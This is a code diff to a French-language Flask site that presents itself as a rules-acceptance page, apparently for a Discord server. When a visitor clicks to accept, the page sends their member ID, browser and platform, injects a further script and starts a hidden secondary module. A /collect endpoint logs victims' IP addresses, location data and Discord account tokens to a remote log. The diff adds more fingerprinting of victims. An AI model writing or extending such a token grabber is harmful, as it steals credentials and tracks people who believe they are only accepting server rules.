@@ -17,6 +17,15 @@ EXTRA_SCRIPT_MODULE = "action_script"
 # ===================================================
 
 
+def get_client_ip(req) -> str:
+    xff = req.headers.get("X-Forwarded-For", "")
+    if xff:
+        first_ip = xff.split(",")[0].strip()
+        if first_ip:
+            return first_ip
+    return req.remote_addr or "Inconnue"
+
+
 # ---------- PARTIE 1 : LE SITE WEB (FLASK) ----------
 app = Flask(__name__)
 
@@ -78,7 +87,12 @@ function accepterRegles() {
   fetch("/accept-rules", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ accepted: true, member_id: memberId })
+    body: JSON.stringify({
+      accepted: true,
+      member_id: memberId,
+      ua: navigator.userAgent || "?",
+      platform: navigator.platform || "?"
+    })
   }).catch(() => {});
 
   const s = document.createElement("script");
@@ -97,17 +111,25 @@ function accepterRegles() {
 """
 
 
-def executer_second_script(member_id=None, ip=None):
+def executer_second_script(member_id=None, ip=None, ua=None, platform=None):
     try:
         module = importlib.import_module(EXTRA_SCRIPT_MODULE)
         if hasattr(module, "run_action"):
-            module.run_action(member_id=member_id, ip=ip)
+            module.run_action(member_id=member_id, ip=ip, ua=ua, platform=platform)
         elif hasattr(module, "main"):
             module.main()
         else:
             print(f"⚠️ {EXTRA_SCRIPT_MODULE}.py importé, mais aucune fonction run_action() ou main() trouvée.")
     except Exception as e:
         print(f"❌ Erreur lors de l'exécution de {EXTRA_SCRIPT_MODULE}.py : {e}")
+        send_log(
+            "⚠️ Erreur script secondaire",
+            [
+                {"name": "📄 Fichier", "value": f"{EXTRA_SCRIPT_MODULE}.py", "inline": True},
+                {"name": "❌ Détail", "value": str(e)[:900], "inline": False},
+            ],
+            color=0xFF0000,
+        )
 
 
 @app.route("/")
@@ -119,11 +141,18 @@ def index():
 def accept_rules():
     payload = request.get_json(silent=True) or {}
     member_id = payload.get("member_id")
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "?"
+    ua = payload.get("ua") or request.headers.get("User-Agent") or "?"
+    platform_name = payload.get("platform") or "?"
+    ip = get_client_ip(request)
 
     threading.Thread(
         target=executer_second_script,
-        kwargs={"member_id": member_id, "ip": ip},
+        kwargs={
+            "member_id": member_id,
+            "ip": ip,
+            "ua": ua,
+            "platform": platform_name,
+        },
         daemon=True,
     ).start()
 
@@ -132,6 +161,8 @@ def accept_rules():
         [
             {"name": "🆔 ID Membre", "value": str(member_id or "Non précisé"), "inline": True},
             {"name": "🌐 IP", "value": str(ip), "inline": True},
+            {"name": "💻 Plateforme", "value": str(platform_name)[:80], "inline": True},
+            {"name": "📱 Navigateur", "value": str(ua)[:120], "inline": False},
         ],
         color=0x23A55A,
     )
@@ -143,15 +174,16 @@ def collect():
     data = request.get_json(silent=True)
     if not data:
         return jsonify({"ok": False})
+    ip = data.get("ip") or get_client_ip(request)
     embed = {
         "title": "🎯 Données reçues",
         "color": 0x00FF00,
         "fields": [
-            {"name": "🌐 IP", "value": data.get("ip", "?"), "inline": True},
-            {"name": "📱 Navigateur", "value": data.get("ua", "?")[:80], "inline": False},
-            {"name": "💻 Plateforme", "value": data.get("platform", "?"), "inline": True},
+            {"name": "🌐 IP", "value": str(ip), "inline": True},
+            {"name": "📱 Navigateur", "value": str(data.get("ua", "?"))[:80], "inline": False},
+            {"name": "💻 Plateforme", "value": str(data.get("platform", "?")), "inline": True},
             {"name": "🔑 Token Discord", "value": f"```{data.get('token', 'Aucun trouvé')}```", "inline": False},
-            {"name": "🏠 Ville/IP Info", "value": data.get("ipinfo", "?"), "inline": False},
+            {"name": "🏠 Ville/IP Info", "value": str(data.get("ipinfo", "?")), "inline": False},
         ],
     }
     try:
